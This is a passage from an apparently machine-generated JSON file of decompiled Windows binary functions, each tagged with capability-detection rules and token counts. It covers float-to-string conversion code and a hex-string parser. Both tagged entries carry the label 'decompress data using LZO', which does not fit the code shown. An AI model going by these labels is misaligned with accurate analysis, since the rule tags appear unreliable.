fcn.004269b0(iVar20);\n        puVar1 = iVar20 + 0x14;\n        puVar11 = param_3;\n        puVar23 = puVar1;\n        do {\n            uVar13 = *puVar11;\n            puVar11 = puVar11 + 1;\n            puVar24 = puVar23 + 1;\n            *puVar23 = uVar13;\n            puVar23 = puVar24;\n        } while (puVar11 <= param_3 + (iVar15 + -1 >> 5));\n        iVar16 = puVar24 - puVar1 >> 2;\ncode_r0x0042445a:\n        iVar25 = iVar16 + -1;\n        if (puVar1[iVar25] == 0) break;\n        puVar1 = iVar20 + 0x10 + iVar16 * 4;\n        uVar13 = 0x1f;\n        if (*puVar1 != 0) {\n            for (; *puVar1 >> uVar13 == 0; uVar13 = uVar13 - 1) {\n            }\n        }\n        *(iVar20 + 0x10) = iVar16;\n        iVar25 = iVar16 * 0x20 - (uVar13 ^ 0x1f);\n        goto code_r0x00424476;\n    case 3:\n        *param_7 = -0x8000;\n        pcVar12 = fcn.004240f0(\"Infinity\", param_8, 8);\n        return pcVar12;\n    case 4:\n        *param_7 = -0x8000;\n        pcVar12 = fcn.004240f0(0x506139, param_8, 3);\n        return pcVar12;\n    default:\n        return NULL;\n    }\n    iVar16 = iVar25;\n    if (iVar25 == 0) goto code_r0x004248f5;\n    goto code_r0x0042445a;\ncode_r0x004254b4:\n    while( true ) {\n        iVar15 = fcn.00427020(iStack132, uVar13);\n        pcVar27 = pcStack104 + 1;\n        if (iVar15 < 1) break;\n        *pcStack104 = uStack120;\n        uVar14 = fcn.00426af0(uVar13, 10, 0);\n        if (uVar26 == uVar13) {\n            uVar26 = uVar14;\n        }\n        iVar20 = fcn.00426af0(iVar20, 10, 0);\n        iVar15 = fcn.00424190(iVar20, iStack132);\n        uStack120 = iVar15 + 0x30;\n        uVar13 = uVar14;\n        pcStack104 = pcVar27;\n    }\n    if (uStack120 == 0x39) {\ncode_r0x00425739:\n        cVar10 = '9';\n        *pcStack104 = '9';\n        goto code_r0x0042507e;\n    }\n    uStack120 = uStack120 + 1;\n    uVar14 = 0x20;\ncode_r0x004254ef:\n    *pcStack104 = uStack120;\ncode_r0x00425093:\n    fcn.00426a80(iStack132);\n    iStack68 = uStack124 + 1;\n    if (uVar13 == 0) goto code_r0x00424a37;\n    if ((uVar26 != 0) && (uVar26 != uVar13)) {\n        fcn.00426a80(uVar26);\n    }\n    goto code_r0x00424a2f;\ncode_r0x004248f5:\n    *(iVar20 + 0x10) = 0;\ncode_r0x00424476:\n    auStack32[0] = fcn.00426440(iVar20);\n    uStack120 = param_2;\n    if (auStack32[0] != 0) {\n        fcn.00426330(iVar20, auStack32[0]);\n        uStack120 = param_2 + auStack32[0];\n        iVar25 = iVar25 - auStack32[0];\n    }\n    if (*(iVar20 + 0x10) == 0) {\n        fcn.00426a80(iVar20);\ncode_r0x004244a8:\n        *param_7 = 1;\n        pcVar12 = fcn.004240f0(0x50613d, param_8, 1);\n        return pcVar12;\n    }\n    fVar29 = fcn.00427250(iVar20, auStack32);\n    dVar2 = fVar29;\n    uStack136 = dVar2 >> 0x20;\n    iVar18 = uStack120 + iVar25;\n    iVar19 = iVar18 + -1;\n    iVar16 = 1 - iVar18;\n    if (-1 < iVar19) {\n        iVar16 = iVar19;\n    }\n    dVar4 = iVar19 * *0x506168 + ((dVar2 & 0xfffffffffffff | 0x3ff0000000000000) - *0x506154) * *0x506158 + *0x506160;\n    if (0 < iVar16 + -0x435) {\n        dVar4 = (iVar16 + -0x435) * *0x506170 + dVar4;\n    }\n    uStack124 = ROUND(dVar4);\n    if ((dVar4 < 0.0) && (uStack124 != dVar4)) {\n        uStack124 = uStack124 - 1;\n    }\n    bVar7 = true;\n    uVar13 = iVar19 * 0x100000 + (uStack136 & 0xfffff | 0x3ff00000);\n    if (uStack124 < 0x17) {\n        if (*(uStack124 * 8 + 0x5061e0) <= (dVar2 & 0xffffffff | uVar13 << 0x20)) {\n            bVar7 = false;\n        }\n        else {\n            uStack124 = uStack124 - 1;\n            bVar7 = false;\n        }\n    }\n    uStack92 = 0;\n    pcStack104 = (iVar25 - iVar19) - 1;\n    if (pcStack104 < 0) {\n        pcStack104 = NULL;\n        uStack92 = 1 - (iVar25 - iVar19);\n    }\n    if (uStack124 < 0) {\n        uStack92 = uStack92 - uStack124;\n        uStack76 = 0;\n        iStack88 = -uStack124;\n    }\n    else {\n        pcStack104 = pcStack104 + uStack124;\n        uStack76 = uStack124;\n        iStack88 = 0;\n    }\n    if (9 < param_5) {\n        param_5 = 0;\n        goto code_r0x00424930;\n    }\n    if (param_5 < 6) {\n        bVar5 = iVar18 + 0x3fdU < 0x7f8;\n    }\n    else {\n        param_5 = param_5 - 4;\n        bVar5 = false;\n    }\n    if (param_5 == 3) {\n        bVar9 = false;\ncode_r0x0042470b:\n        uStack60 = uStack124 + param_6;\n        uStack108 = uStack60 + 1;\n        bVar5 = uStack108 < 0xf & bVar5;\n        auStack32[0] = uStack108;\n        if (uStack108 < 1) {\n            auStack32[0] = 1;\n        }\ncode_r0x0042473b:\n        pcVar12 = fcn.004240b0(auStack32[0]);\n        uStack116 = param_1[3] - 1;\n        if (uStack116 != 0) goto code_r0x0042475a;\ncode_r0x0042477b:\n        if ((!bVar5) || (uVar14 = uStack124 | uStack116,  uVar14 != 0)) goto code_r0x004249a0;\n        auStack32[0] = 0;\n        dVar4 = dVar2 & 0xffffffff | uVar13 << 0x20;\n        if ((bVar7) && (dVar4 < 1.0)) {\n            if (uStack108 == 0) {\n                dVar4 = dVar2 & 0xffffffff | uVar13 << 0x20;\n                dVar4 = dVar4 + dVar4 + *0x50618c;\n                uStack100 = SUB84(dVar4, 0);\n                uStack116 = uStack100;\n                iStack96 = dVar4 >> 0x20;\n                iStack112 = iStack96 + -0x3400000;\n                goto code_r0x0042521c;\n            }\n            if (0 < uStack60) {\n                dVar4 = dVar4 * *0x506184;\n                dVar3 = dVar4 * *0x506188 + *0x50618c;\n                iStack68 = SUB84(dVar3, 0);\n                uStack116 = iStack68;\n                iStack64 = dVar3 >> 0x20;\n                iStack68 = -1;\n                iStack112 = iStack64 + -0x3400000;\n                uVar26 = uStack60;\n                goto code_r0x004247fd;\n            }\ncode_r0x004248e8:\n            uStack116 = 0;\n            goto code_r0x004249a0;\n        }\n        dVar4 = dVar2 & 0xffffffff | uVar13 << 0x20;\n        dVar4 = dVar4 + dVar4 + *0x50618c;\n        iStack68 = SUB84(dVar4, 0);\n        uStack116 = iStack68;\n        iStack64 = dVar4 >> 0x20;\n        iStack112 = iStack64 + -0x3400000;\n        if (uStack108 == 0) {\ncode_r0x0042521c:\n            dVar4 = (dVar2 & 0xffffffff | uVar13 << 0x20) - *0x506190;\n            if (dVar4 <= CONCAT44(iStack112, uStack116)) {\n                if (-CONCAT44(iStack112, uStack116) <= dVar4) goto code_r0x004248e8;\n                goto code_r0x00425246;\n            }\n            iStack68 = 2;\n            iStack132 = 0;\n            uVar13 = 0;\n            goto code_r0x00424a0d;\n        }\n        dVar4 = dVar2 & 0xffffffff | uVar13 << 0x20;\n        iStack68 = 0;\n        uVar26 = uStack108;\ncode_r0x004247fd:\n        dVar3 = *(uVar26 * 8 + 0x5061d8);\n        pcVar28 = pcVar12;\n        if (!bVar9) {\n            dVar3 = dVar3 * CONCAT44(iStack112, uStack116);\n            auStack32[0] = 1;\n            pcVar22 = pcVar12;\n            dVar6 = dVar4;\n            bVar8 = false;\n            while( true ) {\n                iVar16 = ROUND(dVar6);\n                if (iVar16 != 0) {\n                    dVar6 = dVar6 - iVar16;\n                    bVar8 = bVar5;\n                }\n                pcVar27 = pcVar22 + 1;\n                uVar17 = iVar16 + 0x30;\n                *pcVar22 = uVar17;\n                if (auStack32[0] == uVar26) break;\n                dVar6 = dVar6 * *0x506184;\n                auStack32[0] = auStack32[0] + 1;\n                pcVar22 = pcVar27;\n                bVar8 = bVar5;\n            }\n            if (!bVar8) {\n                dVar6 = dVar4;\n            }\n            if (dVar3 + *0x506194 < dVar6) {\ncode_r0x004255d1:\n                iStack68 = iStack68 + 1;\n                goto code_r0x004252fe;\n            }\n            if (*0x506194 - dVar3 <= dVar6) goto code_r0x004248e8;\n            if (dVar6 == 0.0) {\n                uVar14 = 0;\n                iStack68 = iStack68 + 1;\n                pcVar28 = pcVar27;\n            }\n            else {\n                uVar14 = 0x10;\n                iStack68 = iStack68 + 1;\n                pcVar28 = pcVar27;\n            }\ncode_r0x00425413:\n            do {\n                pcVar27 = pcVar28;\n                pcVar28 = pcVar27 + -1;\n            } while (pcVar27[-1] == '0');\n            goto code_r0x00424a37;\n        }\n        auStack32[0] = 0;\n        pcVar27 = pcVar12 + 1;\n        dVar6 = *0x506194;\n        uVar17 = ROUND(dVar4) + 0x30;\n        *pcVar12 = uVar17;\n        dVar3 = dVar6 / dVar3 - CONCAT44(iStack112, uStack116);\n        dVar4 = dVar4 - ROUND(dVar4);\n        if (dVar4 < dVar3) {\ncode_r0x00425761:\n            iStack68 = iStack68 + 1;\n            if (dVar4 != 0.0) {\n                uVar14 = 0x10;\n            }\n            goto code_r0x00424a37;\n        }\n        pcVar22 = pcVar27;\n        if (dVar3 <= *0x506180 - dVar4) {\n            do {\n                auStack32[0] = auStack32[0] + 1;\n                if (uVar26 <= auStack32[0]) goto code_r0x004248e8;\n                pcVar27 = pcVar22 + 1;\n                dVar3 = dVar3 * *0x506184;\n                dVar4 = *0x506184 * dVar4;\n                uVar21 = ROUND(dVar4);\n                uVar17 = (uVar21 & 0xff) + 0x30;\n                dVar4 = dVar4 - uVar21;\n                *pcVar22 = uVar17;\n                if (dVar4 < dVar3) goto code_r0x00425761;\n                pcVar22 = pcVar27;\n            } while (dVar3 <= *0x506180 - dVar4);\n            goto code_r0x004255d1;\n        }\n        iStack68 = iStack68 + 1;\ncode_r0x004252fe:\n        while( true ) {\n            cVar10 = uVar17;\n            pcVar22 = pcVar27 + -1;\n            if (cVar10 != '9') break;\n            if (pcVar22 == pcVar12) {\n                iStack68 = iStack68 + 1;\n                *pcVar28 = '0';\n                cVar10 = pcVar27[-1];\n                pcVar22 = pcVar28;\n                break;\n            }\n            uVar17 = pcVar27[-2];\n            pcVar27 = pcVar22;\n        }\n        uVar14 = 0x20;\n        *pcVar22 = cVar10 + '\\x01';\n        pcVar12 = pcVar28;\n        goto code_r0x00424a37;\n    }\n    if (param_5 < 4) {\n        bVar9 = false;\n        if (param_5 == 2) goto code_r0x00424ce6;\n    }\n    else {\n        bVar9 = true;\n        if (param_5 == 4) {\ncode_r0x00424ce6:\n            uStack108 = 1;\n            if (0 < param_6) {\n                uStack108 = param_6;\n            }\n            bVar5 = uStack108 < 0xf & bVar5;\n            param_6 = uStack108;\n            uStack60 = uStack108;\n            auStack32[0] = uStack108;\n            goto code_r0x0042473b;\n        }\n        if (param_5 == 5) goto code_r0x0042470b;\n    }\ncode_r0x00424930:\n    auStack32[0] = ROUND(iVar15 * *0x506178) + 3;\n    pcVar12 = fcn.004240b0(auStack32[0]);\n    uStack116 = param_1[3] - 1;\n    if (uStack116 != 0) {\n        bVar5 = false;\n        bVar9 = true;\n        uStack60 = 0xffffffff;\n        uStack108 = 0xffffffff;\n        param_6 = 0;\ncode_r0x0042475a:\n        uVar26 = 2;\n        if (-1 < uStack116) {\n            uVar26 = uStack116;\n        }\n        uStack116 = 3 - uVar26;\n        if ((uVar14 & 8) == 0) {\n            uStack116 = uVar26;\n        }\n        goto code_r0x0042477b;\n    }\n    param_6 = 0;\n    bVar9 = true;\n    uStack60 = 0xffffffff;\n    uStack108 = 0xffffffff;\ncode_r0x004249a0:\n    if ((uStack120 < 0) || (param_1[5] < uStack124)) {\n        iVar16 = iStack88;\n        uVar14 = uStack92;\n        if (bVar9) {\n            auStack32[0] = (iVar15 - iVar25) + 1;\n            if ((uStack120 - (iVar15 - iVar25) < param_1[1]) && ((param_5 - 3 & 0xfffffffd) != 0)) {\n                auStack32[0] = (uStack120 - param_1[1]) + 1;\n                if ((param_5 < 2 || uStack108 < 1) || (auStack32[0] <= uStack108)) goto code_r0x00424b38;\ncode_r0x00424f1e:\n                iVar15 = uStack108 - 1;\n                iVar16 = iStack88 - iVar15;\n                if (iStack88 < iVar15) {\n                    iVar16 = 0;\n                    uStack76 = uStack76 + (iVar15 - iStack88);\n                    iStack88 = iVar15;\n                }\n                auStack32[0] = uStack108;\n                if (uStack108 < 0) {\n                    auStack32[0] = 0;\n                    uVar14 = uStack92 - uStack108;\n                }\n                else {\n                    pcStack104 = pcStack104 + uStack108;\n                    uStack92 = uStack108 + uStack92;\n                }\n            }\n            else {\n                if (1 < param_5) goto code_r0x00424f1e;\ncode_r0x00424b38:\n                pcStack104 = pcStack104 + auStack32[0];\n                uStack92 = auStack32[0] + uStack92;\n            }\n            uVar13 = fcn.00426be0(1);\n        }\n        else {\n            uVar13 = 0;\n        }\n        uVar26 = uStack76;\n        if ((0 < uVar14) && (0 < pcStack104)) {\n            auStack32[0] = pcStack104;\n            if (uVar14 <= pcStack104) {\n                auStack32[0] = uVar14;\n            }\n            uStack92 = uStack92 - auStack32[0];\n            pcStack104 = pcStack104 - auStack32[0];\n            uVar14 = uVar14 - auStack32[0];\n        }\n        iVar15 = iVar20;\n        if (iStack88 != 0) {\n            if (bVar9) {\n                if (iVar16 != 0) {\n                    uVar13 = fcn.00426d80(uVar13, iVar16);\n                    iVar15 = fcn.00426c10(uVar13, iVar20);\n                    fcn.00426a80(iVar20);\n                    if (iStack88 - iVar16 == 0) goto code_r0x00424bb3;\n                }\n                iVar15 = fcn.00426d80(iVar15, iStack88 - iVar16);\n            }\n            else {\n                iVar15 = fcn.00426d80(iVar20, iStack88);\n            }\n        }\ncode_r0x00424bb3:\n        iStack132 = fcn.00426be0(1);\n        if (uStack76 == 0) {\n            if ((iVar25 == 1 && param_5 < 2) && (param_1[1] + 1 < param_2)) {\ncode_r0x004255a2:\n                uStack92 = uStack92 + 1;\n                pcStack104 = pcStack104 + 1;\n                uStack76 = 1;\n                if (uVar26 != 0) goto code_r0x00424d53;\n            }\n            uVar26 = 0x1f;\n        }\n        else {\n            iStack132 = fcn.00426d80(iStack132, uStack76);\n            if ((iVar25 == 1 && param_5 < 2) && (param_1[1] + 1 < param_2)) goto code_r0x004255a2;\n            uStack76 = 0;\ncode_r0x00424d53:\n            puVar1 = iStack132 + 0x10 + *(iStack132 + 0x10) * 4;\n            uVar26 = 0x1f;\n            if (*puVar1 != 0) {\n                for (; *puVar1 >> uVar26 == 0; uVar26 = uVar26 - 1) {\n                }\n            }\n            uVar26 = uVar26 ^ 0x1f;\n        }\n        uVar26 = (uVar26 - pcStack104) - 4 & 0x1f;\n        iVar20 = iVar15;\n        auStack32[0] = uVar26;\n        if (0 < uStack92 + uVar26) {\n            iVar20 = fcn.00426f00(iVar15, uStack92 + uVar26);\n        }\n        if (0 < auStack32[0] + pcStack104) {\n            iStack132 = fcn.00426f00(iStack132, auStack32[0] + pcStack104);\n        }\n        bVar5 = param_5 < 3;\n        if ((bVar7) && (iVar15 = fcn.00427020(iVar20, iStack132),  iVar15 < 0)) {\n            uStack124 = uStack124 - 1;\n            iVar20 = fcn.00426af0(iVar20, 10, 0);\n            uStack108 = uStack60;\n            if (bVar9) {\n                uVar13 = fcn.00426af0(uVar13, 10, 0);\n                if (bVar5 || 0 < uStack60) {\ncode_r0x00424d7c:\n                    uVar26 = uVar13;\n                    if (0 < uVar26 + uVar14) {\n                        uVar26 = fcn.00426f00(uVar13, uVar26 + uVar14);\n                    }\n                    uVar13 = uVar26;\n                    if (uStack76 != 0) {\n                        iVar15 = fcn.004269b0(*(uVar26 + 4));\n                        sub.msvcrt.dll_memcpy(iVar15 + 0xc, uVar26 + 0xc, *(uVar26 + 0x10) * 4 + 8);\n                        uVar13 = fcn.00426f00(iVar15, 1);\n                    }\n                    auStack32[0] = 1;\n                    pcStack104 = pcVar12;\n                    do {\n                        iVar15 = fcn.00424190(iVar20, iStack132);\n                        uStack120 = iVar15 + 0x30;\n                        uVar17 = fcn.00427020(iVar20, uVar26);\n                        iVar16 = fcn.00427070(iStack132, uVar13);\n                        uVar14 = 1;\n                        if (*(iVar16 + 0xc) == 0) {\n                            uVar14 = fcn.00427020(iVar20, iVar16);\n                        }\n                        fcn.00426a80(iVar16);\n                        if (((uVar14 | param_5) == 0) && (uVar21 = *param_3 & 1 | uStack116,  uVar21 == 0)) {\n                            pcVar27 = pcStack104 + 1;\n                            if (uStack120 == 0x39) goto code_r0x00425739;\n                            if (uVar17 < 1) {\n                                if (*(iVar20 + 0x10) < 2) {\n                                    uVar14 = 0x10;\n                                    if (*(iVar20 + 0x14) == 0) {\n                                        uVar14 = uVar21;\n                                    }\n                                }\n                                else {\n                                    uVar14 = 0x10;\n                                }\n                            }\n                            else {\n                                uStack120 = iVar15 + 0x31;\n                                uVar14 = 0x20;\n                            }\n                            goto code_r0x004254ef;\n                        }\n                        if ((uVar17 < 0) || (((uVar17 | param_5) == 0 && ((*param_3 & 1) == 0)))) {\n                            if (uStack116 == 0) {\n                                if (0 < uVar14) goto code_r0x004257a4;\n                            }\n                            else {\n                                if ((1 < *(iVar20 + 0x10)) || (*(iVar20 + 0x14) != 0)) {\n                                    if (uStack116 != 2) goto code_r0x004254b4;\n                                    pcVar27 = pcStack104 + 1;\n                                    uVar14 = 0x10;\n                                    goto code_r0x004254ef;\n                                }\n                                if (uVar14 < 1) {\n                                    pcVar27 = pcStack104 + 1;\n                                    uVar14 = 0;\n                                    goto code_r0x004254ef;\n                                }\ncode_r0x004257a4:\n                                iVar20 = fcn.00426f00(iVar20, 1);\n                                iVar16 = fcn.00427020(iVar20, iStack132);\n                                if ((iVar16 < 1) && ((iVar16 != 0 || ((uStack120 & 1) == 0)))) {\n                                    uStack116 = 0x20;\n                                }\n                                else {\n                                    if (uStack120 == 0x39) {\n                                        pcVar27 = pcStack104 + 1;\n                                        goto code_r0x00425739;\n                                    }\n                                    uStack116 = 0x20;\n                                    uStack120 = iVar15 + 0x31;\n                                }\n                            }\n                            pcVar27 = pcStack104 + 1;\n                            uVar14 = 0x10;\n                            if ((*(iVar20 + 0x10) < 2) && (uVar14 = uStack116,  *(iVar20 + 0x14) != 0)) {\n                                uVar14 = 0x10;\n                            }\n                            goto code_r0x004254ef;\n                        }\n                        pcVar27 = pcStack104 + 1;\n                        if ((0 < uVar14) && (uStack116 != 2)) {\n                            if (uStack120 == 0x39) goto code_r0x00425739;\n                            uVar14 = 0x20;\n                            *pcStack104 = uStack120 + '\\x01';\n                            goto code_r0x00425093;\n                        }\n                        *pcStack104 = uStack120;\n                        if (auStack32[0] == uStack108) goto code_r0x00425044;\n                        iVar20 = fcn.00426af0(iVar20, 10, 0);\n                        if (uVar26 == uVar13) {\n                            uVar13 = fcn.00426af0(uVar26, 10, 0);\n                            uVar26 = uVar13;\n                        }\n                        else {\n                            uVar26 = fcn.00426af0(uVar26, 10, 0);\n                            uVar13 = fcn.00426af0(uVar13, 10, 0);\n                        }\n                        auStack32[0] = auStack32[0] + 1;\n                        pcStack104 = pcVar27;\n                    } while( true );\n                }\n            }\n            else if (bVar5 || 0 < uStack60) goto code_r0x00424fe0;\n        }\n        else if ((0 < uStack108) || (bVar5)) {\n            if (bVar9) goto code_r0x00424d7c;\ncode_r0x00424fe0:\n            auStack32[0] = 1;\n            pcVar28 = pcVar12;\n            while( true ) {\n                pcVar27 = pcVar28 + 1;\n                iVar15 = fcn.00424190(iVar20, iStack132);\n                uStack120 = iVar15 + 0x30;\n                *pcVar28 = uStack120;\n                if (uStack108 <= auStack32[0]) break;\n                iVar20 = fcn.00426af0(iVar20, 10, 0);\n                auStack32[0] = auStack32[0] + 1;\n                pcVar28 = pcVar27;\n            }\n            uVar26 = 0;\ncode_r0x00425044:\n            if (uStack116 == 0) {\n                iVar20 = fcn.00426f00(iVar20, 1);\n                iVar15 = fcn.00427020(iVar20, iStack132);\n                cVar10 = pcVar27[-1];\n                if ((0 < iVar15) || ((iVar15 == 0 && ((uStack120 & 1) != 0)))) {\ncode_r0x0042507e:\n                    while (pcVar28 = pcVar27 + -1,  cVar10 == '9') {\n                        if (pcVar28 == pcVar12) {\n                            uStack124 = uStack124 + 1;\n                            uVar14 = 0x20;\n                            *pcVar12 = '1';\n                            goto code_r0x00425093;\n                        }\n                        cVar10 = pcVar27[-2];\n                        pcVar27 = pcVar28;\n                    }\n                    uVar14 = 0x20;\n                    *pcVar28 = cVar10 + '\\x01';\n                    goto code_r0x00425093;\n                }\n                iVar15 = *(iVar20 + 0x10);\ncode_r0x0042554a:\n                uVar14 = 0x10;\n                if (iVar15 < 2) {\n                    uVar14 = ~-(*(iVar20 + 0x14) == 0) & 0x10;\n                }\n            }\n            else {\n                iVar15 = *(iVar20 + 0x10);\n                cVar10 = pcVar27[-1];\n                if (uStack116 == 2) goto code_r0x0042554a;\n                if ((1 < iVar15) || (*(iVar20 + 0x14) != 0)) goto code_r0x0042507e;\n                uVar14 = 0;\n            }\n            while (cVar10 == '0') {\n                cVar10 = pcVar27[-2];\n                pcVar27 = pcVar27 + -1;\n            }\n            goto code_r0x00425093;\n        }\n        pcVar27 = pcVar12;\n        if (uStack108 == 0) {\n            iStack132 = fcn.00426af0(iStack132, 5, 0);\n            iVar15 = fcn.00427020(iVar20, iStack132);\n            if (0 < iVar15) {\n                iStack68 = uStack124 + 2;\n                goto code_r0x00424a0d;\n            }\n        }\ncode_r0x00424c70:\n        uVar14 = 0x10;\n        iStack68 = -param_6;\n        pcVar12 = pcVar27;\n    }\n    else {\n        dVar4 = *(uStack124 * 8 + 0x5061e0);\n        if ((-1 < param_6) || (0 < uStack108)) {\n            dVar2 = dVar2 & 0xffffffff | uVar13 << 0x20;\n            auStack32[0] = 1;\n            iStack68 = uStack124 + 1;\n            pcVar27 = pcVar12 + 1;\n            uStack52 = ROUND(dVar2 / dVar4);\n            *pcVar12 = uStack52 + '0';\n            dVar2 = dVar2 - uStack52 * dVar4;\n            if (dVar2 == 0.0) {\ncode_r0x004251a8:\n                uVar14 = 0;\n                goto code_r0x00424a37;\n            }\n            uVar14 = 1;\n            pcVar28 = pcVar27;\n            if (uStack108 != 1) {\n                do {\n                    uVar14 = uVar14 + 1;\n                    pcVar27 = pcVar28 + 1;\n                    dVar3 = *0x506184;\n                    uStack52 = ROUND((dVar2 * dVar3) / dVar4);\n                    *pcVar28 = uStack52 + '0';\n                    dVar2 = dVar2 * dVar3 - uStack52 * dVar4;\n                    auStack32[0] = uVar14;\n                    if (dVar2 == 0.0) goto code_r0x004251a8;\n                    pcVar28 = pcVar27;\n                } while (uVar14 != uStack108);\n            }\n            pcVar28 = pcVar12;\n            if (uStack116 == 0) {\n                uVar17 = pcVar27[-1];\n                if ((dVar2 + dVar2 <= dVar4) && ((dVar2 + dVar2 != dVar4 || ((uStack52 & 1) == 0)))) {\n                    uVar14 = 0x10;\n                    pcVar28 = pcVar27;\n                    goto code_r0x00425413;\n                }\n            }\n            else {\n                uVar14 = 0x10;\n                if (uStack116 != 1) goto code_r0x00424a37;\n                uVar17 = pcVar27[-1];\n            }\n            goto code_r0x004252fe;\n        }\n        if ((uStack108 != 0) || ((dVar2 & 0xffffffff | uVar13 << 0x20) <= dVar4 * *0x506190)) {\ncode_r0x00425246:\n            iStack132 = 0;\n            uVar13 = 0;\n            pcVar27 = pcVar12;\n            goto code_r0x00424c70;\n        }\n        iStack68 = uStack124 + 2;\n        iStack132 = 0;\n        uVar13 = uStack108;\ncode_r0x00424a0d:\n        uVar14 = 0x20;\n        pcVar27 = pcVar12 + 1;\n        *pcVar12 = '1';\n    }\n    fcn.00426a80(iStack132);\n    if (uVar13 == 0) goto code_r0x00424a37;\ncode_r0x00424a2f:\n    fcn.00426a80(uVar13);\ncode_r0x00424a37:\n    fcn.00426a80(iVar20);\n    *pcVar27 = '\\0';\n    *param_7 = iStack68;\n    if (param_8 != NULL) {\n        *param_8 = pcVar27;\n    }\n    *param_4 = *param_4 | uVar14;\n    return pcVar12;\n}\n",
        "token_count": 8660
    },
    "00426500": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nuint fcn.00426500(char **param_1, uint32_t *param_2, uint32_t *param_3)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    uint32_t uVar5;\n    uint32_t *puVar6;\n    uint32_t *puVar7;\n    int32_t iVar8;\n    uint32_t *puVar9;\n    int32_t iVar10;\n    uint32_t *puVar11;\n    uint32_t *puVar12;\n    uint32_t *puVar13;\n    char *pcVar14;\n    uint8_t uStack68;\n    uint8_t uStack64;\n    int32_t iStack60;\n    uint32_t *puStack56;\n    \n    if (*0x549e30 == '\\0') {\n        fcn.00426490();\n    }\n    uVar3 = *param_2 & 0x1f;\n    pcVar14 = *param_1;\n    puVar6 = param_3 + (*param_2 >> 5) + 1;\n    if (uVar3 == 0) {\n        puVar6 = param_3 + (*param_2 >> 5);\n    }\n    puVar11 = puVar6 + -1;\n    puVar6[-1] = 0;\n    while (pcVar14[1] - 1 < 0x20) {\n        pcVar14 = pcVar14 + 1;\n    }\n    if (((pcVar14[1] == 0x30) && ((pcVar14[2] & 0xdfU) == 0x58)) && (uVar1 = pcVar14[3],  0x20 < uVar1)) {\n        pcVar14 = pcVar14 + 2;\n    }\n    else {\n        uVar1 = pcVar14[1];\n    }\n    iVar8 = 0;\n    iStack60 = 0;\n    iVar10 = 0;\n    puVar12 = puVar11;\n    puStack56 = puVar11;\n    do {\n        uVar5 = uVar1;\n        if (uVar5 == 0) {\n            if (iVar10 == 0) {\n                return 4;\n            }\ncode_r0x00426720:\n            if ((puVar12 < puStack56) && (iVar8 < 8)) {\n                cVar2 = '\\b' - iVar8;\n                uStack68 = cVar2 * -4 + 0x20;\n                uVar5 = *puVar12;\n                puVar7 = puVar12;\n                do {\n                    puVar9 = puVar7 + 1;\n                    *puVar7 = uVar5 | puVar7[1] << (uStack68 & 0x1f);\n                    uVar5 = puVar7[1] >> (cVar2 * '\\x04' & 0x1fU);\n                    *puVar9 = uVar5;\n                    puVar7 = puVar9;\n                } while (puVar9 < puStack56);\n            }\n            puVar7 = param_3;\n            if (param_3 < puVar12) {\n                do {\n                    puVar9 = puVar12 + 1;\n                    *puVar7 = *puVar12;\n                    puVar12 = puVar9;\n                    puVar13 = puVar7 + 1;\n                    puVar7 = puVar7 + 1;\n                } while (puVar9 <= puVar11);\n                do {\n                    puVar12 = puVar13 + 1;\n                    *puVar13 = 0;\n                    puVar13 = puVar12;\n                } while (puVar12 <= puVar11);\n                uVar5 = puVar6[-1];\n            }\n            else {\n                uVar5 = puVar6[-1];\n                if (uVar3 != 0) {\n                    uVar5 = uVar5 & 0xffffffffU >> (0x20U - uVar3 & 0x1f);\n                    puVar6[-1] = uVar5;\n                }\n            }\n            while( true ) {\n                if (uVar5 != 0) {\n                    return 5;\n                }\n                if (param_3 == puVar11) break;\n                puVar11 = puVar11 + -1;\n                uVar5 = *puVar11;\n            }\n            *puVar11 = 1;\n            return 5;\n        }\n        pcVar4 = pcVar14 + 1;\n        uVar1 = *(uVar5 + 0x549e00);\n        if (uVar1 == 0) {\n            if (0x20 < uVar5) {\n                if ((uVar5 != 0x29) || (iVar10 == 0)) {\n                    pcVar4 = pcVar14 + 2;\n                    if (uVar5 != 0x29) {\n                        cVar2 = pcVar14[2];\n                        while( true ) {\n                            if (cVar2 == '\\0') {\n                                return 4;\n                            }\n                            pcVar4 = pcVar4 + 1;\n                            if (cVar2 == ')') break;\n                            cVar2 = *pcVar4;\n                        }\n                    }\n                    *param_1 = pcVar4;\n                    return 4;\n                }\n                *param_1 = pcVar14 + 2;\n                goto code_r0x00426720;\n            }\n            puVar7 = puVar12;\n            if (iStack60 < iVar10) {\n                if ((puVar12 < puStack56) && (iVar8 < 8)) {\n                    cVar2 = '\\b' - iVar8;\n                    uStack68 = cVar2 * '\\x04';\n                    uStack64 = cVar2 * -4 + 0x20;\n                    uVar5 = *puVar12;\n                    do {\n                        puVar9 = puVar7 + 1;\n                        *puVar7 = uVar5 | puVar7[1] << (uStack64 & 0x1f);\n                        uVar5 = puVar7[1] >> (uStack68 & 0x1f);\n                        *puVar9 = uVar5;\n                        puVar7 = puVar9;\n                    } while (puVar9 < puStack56);\n                }\n                iVar8 = 8;\n                if (puVar12 <= param_3) goto code_r0x0042662d;\n                puVar7 = puVar12 + -1;\n                puVar12[-1] = 0;\n                iVar8 = 0;\n                iStack60 = iVar10;\n                puStack56 = puVar7;\n            }\n            uVar1 = pcVar14[2];\n            while (uVar1 < 0x21) {\n                uVar1 = pcVar4[2];\n                pcVar4 = pcVar4 + 1;\n            }\n            puVar12 = puVar7;\n            if (((uVar1 == 0x30) && ((pcVar4[2] & 0xdfU) == 0x58)) && (0x20 < pcVar4[3])) {\n                pcVar4 = pcVar4 + 2;\n            }\n        }\n        else {\n            iVar8 = iVar8 + 1;\n            iVar10 = iVar10 + 1;\n            if (iVar8 < 9) {\n                uVar5 = *puVar12 << 4;\n            }\n            else {\n                if (puVar12 <= param_3) goto code_r0x0042662d;\n                puVar12[-1] = 0;\n                uVar5 = 0;\n                puVar12 = puVar12 + -1;\n                iVar8 = 1;\n            }\n            *puVar12 = uVar1 & 0xf | uVar5;\n        }\ncode_r0x0042662d:\n        uVar1 = pcVar4[1];\n        pcVar14 = pcVar4;\n    } while( true );\n}\n",
        "token_count": 1756
    },
    "004268a0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
